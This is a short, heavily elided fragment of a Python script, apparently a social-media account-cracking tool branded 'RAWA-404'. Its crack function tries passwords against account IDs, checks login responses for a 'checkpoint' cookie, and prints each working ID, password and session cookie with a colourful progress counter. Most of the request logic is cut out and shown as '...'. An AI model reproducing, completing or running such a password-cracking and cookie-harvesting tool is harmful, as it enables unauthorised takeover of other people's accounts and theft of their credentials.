...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r[𝐑𝐀𝐖𝐀-𝟒𝟎𝟒] \033[1;37m{Z}{b}{loop}{Z}|{b}{len(id)} \x1b[38;5;208m[\x1b[38;5;48mOK∙{ok}\x1b[38;5;208m]{bo} {bo}{'{:.0%}'.format(loop/float(len(id)))}  "),sys.stdout.flush()
    ...
    'viewport-width': '980',
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r\033[0;92m└──[𝐑𝐀𝐖𝐀-𝐎𝐊] {h}{idf} | {h}{pw} \n {h} └──> \033[38;5;48m{kuki}')
